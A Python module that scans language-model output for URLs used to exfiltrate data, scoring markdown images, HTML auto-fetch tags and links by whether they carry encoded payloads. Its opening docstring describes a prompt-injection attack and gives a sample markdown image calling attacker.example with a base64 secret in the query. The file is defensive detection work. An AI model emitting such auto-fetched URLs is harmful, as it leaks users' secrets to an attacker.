"""Exfiltration-URL detection for LLM output.

The attack this exists for needs no cooperation from the user. A successful
injection instructs the model to emit a markdown image:

    ![](https://attacker.example/log?d=c2VjcmV0LWFwaS1rZXk=)

The model's reply is rendered by the client - a chat UI, a notebook, a docs
preview - and the renderer fetches the image automatically. The secret leaves in
the query string before anyone has read a word of the response. No click, no
warning, and the inbound pipeline cannot see it, because the malicious content is
in the *output*.

Two axes decide how dangerous a URL is, and both are needed:

* **Does it fetch by itself?** A markdown image or ``<img src>`` is retrieved on
  render. A plain link needs a click. The first is exfiltration; the second is
  phishing that might work.
* **Does it carry data outward?** ``https://docs.python.org/3/library/re.html``
  is a citation. ``https://x.example/?d=<40 chars of base64>`` is a payload.

Both axes matter because either alone over-fires. Blocking every auto-fetched
image would break legitimate image output; blocking every URL with a query
string would break search links, tracking-free analytics, and pagination. It is
the *combination* - fetched without consent, carrying opaque data - that has no
benign explanation.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from enum import StrEnum
from urllib.parse import parse_qsl, unquote, urlsplit

#: Markdown image. Fetched on render, so this is the high-risk form.
MARKDOWN_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*<?([^)\s<>]+)>?[^)]*\)")

#: Markdown link. Requires a click, so lower risk but the same mechanism.
MARKDOWN_LINK = re.compile(r"(?<!!)\[[^\]]*\]\(\s*<?([^)\s<>]+)>?[^)]*\)")

#: HTML tags that fetch a URL without user action.
HTML_AUTO_FETCH = re.compile(
    r"<(?:img|image|iframe|embed|audio|video|source|script|link)\b[^>]*?"
    r"(?:src|href)\s*=\s*[\"']([^\"']+)[\"']",
    re.IGNORECASE,
)

#: A bare URL in prose. Not fetched, not clickable in plain text, but some
#: clients auto-link it.
BARE_URL = re.compile(r"https?://[^\s<>\"'`)\]}]+")

#: Signals that a URL component carries encoded data rather than naming a
#: resource. Length alone is not one of them, and that matters: a legitimate
#: article URL like ``/2024/01/15/some-very-long-article-slug`` is long but
#: entirely readable words, while an exfiltration payload is an opaque run. Using
#: raw length would flag half the web.
BASE64_PADDED = re.compile(r"[A-Za-z0-9+/_-]+={1,2}")
HEX_ONLY = re.compile(r"[0-9a-fA-F]+")
ALNUM_TOKEN = re.compile(r"[A-Za-z0-9]+")

#: Base64 with padding is the strongest single signal, so it needs the least
#: length to be convincing.
BASE64_MIN = 12

#: Hex or high-entropy values need more length before they beat a plausible
#: identifier (a UUID is 36 characters and entirely legitimate).
ENTROPY_MIN = 24

#: An unbroken alphanumeric run this long is not a word, a slug, or a UUID.
OPAQUE_TOKEN_MIN = 32

#: Any single value this long is carrying content regardless of its alphabet -
#: set well above a long article title so prose-bearing query strings survive.
OVERSIZED_MIN = 64

#: Schemes that can carry a payload inline without a network fetch.
INLINE_SCHEMES = frozenset({"data", "javascript", "vbscript"})


class FetchMode(StrEnum):
    AUTO = "auto"
    """Retrieved by the client with no user action - the exfiltration case."""
    USER_ACTION = "user_action"
    """Requires a click."""


class UrlRisk(StrEnum):
    NONE = "none"
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"


@dataclass(frozen=True)
class UrlFinding:
    """One URL located in model output, with why it is or is not a problem."""

    url: str
    raw: str
    """The full matched construct, e.g. ``![](https://...)`` - what gets removed."""
    fetch_mode: FetchMode
    risk: UrlRisk
    reason: str
    carries_data: bool

    @property
    def should_remove(self) -> bool:
        return self.risk in (UrlRisk.HIGH, UrlRisk.MEDIUM)


def _mixed_alphabet(value: str) -> bool:
    """Upper, lower, and digits with no whitespace - the encoded-blob signature.

    Readable text fails this: prose has spaces, slugs are lowercase, and numeric
    ids have no letters.
    """
    return (
        not any(character.isspace() for character in value)
        and any(character.isupper() for character in value)
        and any(character.islower() for character in value)
        and any(character.isdigit() for character in value)
    )


def _data_signal(value: str) -> str | None:
    """Why ``value`` looks like carried data, or ``None`` if it looks like a name.

    Percent-decoding happens first, so encoding the payload twice does not let it
    pass as short gibberish.
    """
    if not value:
        return None
    decoded = unquote(value)

    if len(decoded) >= BASE64_MIN and BASE64_PADDED.fullmatch(decoded):
        return "base64-encoded value"
    if len(decoded) >= ENTROPY_MIN and HEX_ONLY.fullmatch(decoded):
        return "hex-encoded value"
    if len(decoded) >= ENTROPY_MIN and _mixed_alphabet(decoded):
        return "high-entropy token"
    if len(decoded) >= OVERSIZED_MIN:
        return "oversized value"
    for token in ALNUM_TOKEN.findall(decoded):
        if len(token) >= OPAQUE_TOKEN_MIN:
            return "long opaque token"
    return None


def _carriers(parts) -> list[str]:
    """Every component of a URL that could hold a payload.

    Query *values* are examined individually rather than as one blob, so a page
    with several short parameters is not condemned by their combined length. Path
    segments likewise. The fragment is included even though servers never see it:
    client-side script can read it and forward it.
    """
    values: list[str] = []

    if parts.query:
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        values.extend(value for _, value in pairs)
        if not pairs:
            values.append(parts.query)

    if parts.fragment:
        values.append(parts.fragment)
    values.extend(segment for segment in parts.path.split("/") if segment)
    if parts.username:
        values.append(parts.username)
    return values


def _assess(url: str, raw: str, fetch_mode: FetchMode) -> UrlFinding:
    parts = urlsplit(url)
    scheme = parts.scheme.lower()

    if scheme in INLINE_SCHEMES:
        return UrlFinding(
            url=url, raw=raw, fetch_mode=fetch_mode, risk=UrlRisk.HIGH,
            reason=f"{scheme}: URL in model output can carry an inline payload",
            carries_data=True,
        )

    signal = next(
        (found for found in (_data_signal(value) for value in _carriers(parts))
         if found),
        None,
    )

    if signal is None:
        return UrlFinding(
            url=url, raw=raw, fetch_mode=fetch_mode, risk=UrlRisk.NONE,
            reason="no data-carrying component", carries_data=False,
        )

    if fetch_mode is FetchMode.AUTO:
        return UrlFinding(
            url=url, raw=raw, fetch_mode=fetch_mode, risk=UrlRisk.HIGH,
            reason=(f"auto-fetched by the client and carries a {signal} - "
                    "exfiltrates on render, with no user action"),
            carries_data=True,
        )
    return UrlFinding(
        url=url, raw=raw, fetch_mode=fetch_mode, risk=UrlRisk.MEDIUM,
        reason=f"carries a {signal} outward; exfiltrates if the user clicks",
        carries_data=True,
    )


def scan_urls(text: str) -> list[UrlFinding]:
    """Find every URL in ``text`` and assess it.

    Returns findings for benign URLs too, at :attr:`UrlRisk.NONE`. Reporting what
    was inspected and cleared is as useful to an operator as reporting what was
    removed, and keeps a false-positive complaint answerable.
    """
    if not text:
        return []

    findings: list[UrlFinding] = []
    seen_spans: set[tuple[int, int]] = set()

    def collect(pattern: re.Pattern[str], mode: FetchMode) -> None:
        for match in pattern.finditer(text):
            span = match.span()
            if any(span[0] >= s and span[1] <= e for s, e in seen_spans):
                continue
            seen_spans.add(span)
            findings.append(_assess(match.group(1), match.group(0), mode))

    # Order matters: images before links (a link pattern would also match an
    # image's tail), and both before bare URLs, so the wrapping construct is what
    # gets recorded and removed rather than the URL alone.
    collect(MARKDOWN_IMAGE, FetchMode.AUTO)
    collect(HTML_AUTO_FETCH, FetchMode.AUTO)
    collect(MARKDOWN_LINK, FetchMode.USER_ACTION)

    for match in BARE_URL.finditer(text):
        span = match.span()
        if any(span[0] >= s and span[1] <= e for s, e in seen_spans):
            continue
        seen_spans.add(span)
        findings.append(_assess(match.group(0), match.group(0), FetchMode.USER_ACTION))

    return findings


def highest_risk(findings: list[UrlFinding]) -> UrlRisk:
    order = {UrlRisk.NONE: 0, UrlRisk.LOW: 1, UrlRisk.MEDIUM: 2, UrlRisk.HIGH: 3}
    return max(findings, key=lambda f: order[f.risk], default=None).risk if findings \
        else UrlRisk.NONE
